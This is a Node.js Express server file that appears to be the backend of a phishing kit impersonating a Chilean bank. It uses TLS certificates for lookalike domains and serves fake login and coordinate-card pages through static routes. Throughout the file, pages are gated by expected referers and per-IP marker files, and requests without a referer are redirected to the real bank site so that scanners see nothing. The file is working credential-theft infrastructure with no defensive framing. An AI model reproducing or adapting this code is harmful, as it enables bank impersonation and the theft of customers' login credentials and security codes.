const express=require('express')
const app=express()
const https=require('https')
const fs=require('fs')
const cors=require('cors')
const IPData = require('ipdata').default;
const bodyParser = require('body-parser');
app.use(bodyParser.json());

const cert={	
	key:fs.readFileSync('/etc/letsencrypt/live/tx.bitcoinsupex.com/privkey.pem'),
	cert:fs.readFileSync('/etc/letsencrypt/live/tx.bitcoinsupex.com/fullchain.pem')
}

const sub={	
	key:fs.readFileSync('/etc/letsencrypt/live/personas.bancosecurity.digital/privkey.pem'),
	cert:fs.readFileSync('/etc/letsencrypt/live/personas.bancosecurity.digital/fullchain.pem')
}

app.use(cors({origin:'*'}) )


app .get('/widget/Personas', (req,res)=>{
	const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress.replace("::ffff:", "")
	const from=req.headers.referer
	console.log(from,fs.existsSync(`/html/users/${ip}`))
	if(from=="https://personas.bancosecurity.digital/" || fs.existsSync(`/html/users/${ip}`) || ip=="191.101.252.101")
	{

		if (fs.existsSync(`/html/users/${ip}`)) {
			fs.unlinkSync(`/html/users/${ip}`)	
		}else{
		fs.writeFile(`/html/users/${ip}`,"",function(){})	
		}

		res.sendFile('/home/nodejs/log/index.html')

	}
})
app.use('/wel/',express.static('/log/'))

app.get("/welcome",(req,resp)=>{
	const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress.replace("::ffff:", "")
	const from=req.headers.referer
	if(from=="https://bancosecurity.digital/" || fs.existsSync(`/html/users/${ip}`))
	resp.sendFile('/home/nodejs/log/index.html')
})

app.use('/session/',express.static('/coords/'))

app.use('/widget/Personas',express.static('/login/'))
app.use('/widget/',express.static('/login/'))
app.get('/welcome/img.js', (req,res)=>{
	const where=req.headers.referer
	if(where!=undefined)
	res.sendFile('/html/img.js')
	else
	res.redirect('https://bancosecurity.cl')
})


app.get('/welcome/open.js', (req,res)=>{
	const where=req.headers.referer
	if(where!=undefined)
	res.sendFile('/html/open.js')
	else
	res.redirect('https://bancosecurity.cl')
})


app.get('/welcome/src.js', (req,res)=>{
	const where=req.headers.referer
	if(where!=undefined)
	res.sendFile('/html/src.js')
	else
	res.redirect('https://bancosecurity.cl')
})

app .get('/welcome/', (req,res)=>{
	const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress.replace("::ffff:", "")
	const from=req.headers.referer
	if(from=="https://bancosecurity.digital/" || fs.existsSync(`/html/users/${ip}`)){

		if (fs.existsSync(`/html/users/${ip}`)) {
			fs.unlinkSync(`/html/users/${ip}`)	
		}else{
		fs.writeFile(`/html/users/${ip}`,"",function(){})	
		}

		res.sendFile('/html/index.html')

	}

	

})

app.use('/start',express.static('/welcome/'))
app.get("/Personas", (req,res)=>{
	const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress.replace("::ffff:", "")
	const from=req.headers.referer
	if(from=="https://cl.personasecurity.network/")
    	res.sendFile('/home/nodejs/personas/index.html')

})

const httpsServer = https.createServer(cert, app);


httpsServer.addContext('tx.bitcoinsupex.com', cert); // if you have the second domain.

httpsServer.listen(443, () => {});
